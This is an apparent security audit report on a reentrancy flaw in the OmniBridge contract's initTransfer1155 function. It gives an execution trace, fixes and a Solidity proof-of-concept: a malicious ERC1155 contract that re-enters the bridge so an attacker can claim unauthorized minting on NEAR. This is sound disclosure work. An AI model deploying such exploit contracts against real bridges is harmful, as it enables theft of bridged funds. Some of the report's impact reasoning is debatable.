Audit Report

## Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Callback Causes Nonce Collision and Unauthorized Cross-Chain Minting — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

## Summary
`initTransfer1155` increments `currentOriginNonce` before making an external `safeTransferFrom` call to an attacker-controlled ERC1155 contract, but reads `currentOriginNonce` again from storage after that external call when passing it to `initTransferExtension` and `emit InitTransfer`. There is no reentrancy guard anywhere in the contract. A malicious ERC1155 can reenter `initTransfer1155` during the callback, causing nonce collision: nonce N is silently skipped while nonce N+1 is emitted twice. Because the malicious `safeTransferFrom` never actually transfers tokens, the attacker produces a valid, relayable `InitTransfer` event without depositing any ERC1155 tokens, resulting in unauthorized minting on NEAR.

## Finding Description
The vulnerable sequence in `initTransfer1155` (lines 448–489):

```
currentOriginNonce += 1;                          // line 448 — nonce becomes N
...
IERC1155(tokenAddress).safeTransferFrom(          // line 458 — external call to attacker contract
    msg.sender, address(this), tokenId, amount, ""
);
...
initTransferExtension(..., currentOriginNonce, ...)  // line 471 — re-reads storage
emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)  // line 483 — re-reads storage
``` [1](#0-0) [2](#0-1) [3](#0-2) 

The nonce is never cached into a local variable before the external call. After `safeTransferFrom` returns, `currentOriginNonce` is read from storage at lines 471 and 483. If a reentrant call has incremented it in the meantime, the outer call silently uses the wrong (inner call's) nonce.

No `nonReentrant` modifier or `ReentrancyGuard` import exists anywhere in the contract — confirmed by the complete absence of any such pattern in the codebase.

`initTransfer1155` performs no whitelist or registration check on `tokenAddress` before making the external call. Any address can be supplied as `tokenAddress`, making the attack fully permissionless. [4](#0-3) 

The `onERC1155Received` guard (lines 522–535) checks `operator != address(this)` to reject direct ERC1155 sends, but this is irrelevant: the malicious `safeTransferFrom` implementation never calls `onERC1155Received` — it reenters `initTransfer1155` directly. [5](#0-4) 

**Reentrant execution trace (starting nonce = 0):**

| Step | `currentOriginNonce` | Action |
|---|---|---|
| Outer call enters | 0→**1** | `currentOriginNonce += 1` |
| Outer call hits `safeTransferFrom` | 1 | External call to malicious ERC1155 |
| Malicious ERC1155 reenters `initTransfer1155` | 1→**2** | Inner: `currentOriginNonce += 1` |
| Inner call hits `safeTransferFrom` | 2 | Malicious ERC1155 returns (no reentry) |
| Inner call: `initTransferExtension` | 2 | Publishes event with **nonce=2** |
| Inner call: `emit InitTransfer` | 2 | Event emitted with **nonce=2** |
| Outer call resumes | 2 | Malicious `safeTransferFrom` returns (no tokens transferred) |
| Outer call: `initTransferExtension` | 2 | Publishes event with **nonce=2** again |
| Outer call: `emit InitTransfer` | 2 | Event emitted with **nonce=2** again |

Result: nonce=1 is never emitted; nonce=2 is emitted twice; zero ERC1155 tokens are deposited.

## Impact Explanation
The `InitTransfer` event (or Wormhole VAA via `initTransferExtension`) is the sole signal the NEAR bridge uses to authorize minting. The NEAR bridge does not verify that the EVM bridge contract actually received ERC1155 tokens — it trusts the emitted event/VAA. The attacker produces a valid, relayable `InitTransfer` for nonce=2 without depositing any tokens. When the relayer submits this proof to NEAR, the NEAR bridge mints the corresponding bridged tokens to the attacker's NEAR address. This is **unauthorized minting of bridged value** — a concrete Critical impact matching the allowed scope: *unauthorized minting of bridged funds*.

Additionally, nonce=1 is permanently skipped. Any legitimate concurrent transfer assigned nonce=1 would be silently lost.

## Likelihood Explanation
The attack requires only:
1. Deploying a malicious ERC1155 contract (permissionless, no admin role).
2. Calling `bridge.initTransfer1155` with that contract as `tokenAddress` (permissionless — no whitelist check exists).
3. Optionally calling `logMetadata1155` first to register the token on NEAR (also permissionless).

No admin compromise, no private key leak, no front-running dependency, and no threshold MPC collusion is required. Any unprivileged EVM address can execute this attack repeatedly.

## Recommendation
1. **Cache the nonce before the external call** so that `initTransferExtension` and `emit` always use the value assigned at the start of the call:

```solidity
function initTransfer1155(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce; // cache before external call
    ...
    IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "");
    ...
    initTransferExtension(..., nonce, ...);
    emit BridgeTypes.InitTransfer(..., nonce, ...);
}
```

2. **Add a `nonReentrant` modifier** (OpenZeppelin `ReentrancyGuardUpgradeable`) to `initTransfer1155`, `initTransfer`, and `finTransfer` as defense-in-depth.

3. Apply the same nonce-caching fix to `initTransfer` (lines 415–436), which also reads `currentOriginNonce` from storage after potential external calls to ERC20 tokens with transfer hooks. [6](#0-5) 

## Proof of Concept
Deploy the following contracts against a local fork of OmniBridge:

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.24;

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress, uint256 tokenId, uint128 amount,
        uint128 fee, uint128 nativeFee,
        string calldata recipient, string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool public reentered;

    constructor(address bridge_) { bridge = IOmniBridge(bridge_); }

    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Inner call: increments nonce to 2, emits InitTransfer(nonce=2)
            bridge.initTransfer1155(address(this), tokenId, uint128(amount), 0, 0, "attacker.near", "");
            // Outer call will also emit InitTransfer(nonce=2); nonce=1 is lost
        }
        // No tokens transferred in either call
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return type(uint256).max; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
}

contract Attacker {
    function attack(address bridge) external payable {
        MaliciousERC1155 token = new MaliciousERC1155(bridge);
        // Single call produces two InitTransfer events for nonce=2,
        // nonce=1 silently skipped, zero ERC1155 tokens deposited.
        IOmniBridge(bridge).initTransfer1155{value: msg.value}(
            address(token), 1, 1000e18, 0, 0, "attacker.near", ""
        );
    }
}
```

**Verification steps:**
1. Deploy OmniBridge on a local testnet.
2. Deploy `Attacker` and call `attack(bridgeAddress)`.
3. Observe: two `InitTransfer` events emitted both with `nonce=2`; no `InitTransfer` with `nonce=1`; bridge ERC1155 balance remains zero.
4. Submit the `InitTransfer(nonce=2)` proof to the NEAR bridge — it mints tokens to `attacker.near` with no EVM deposit.
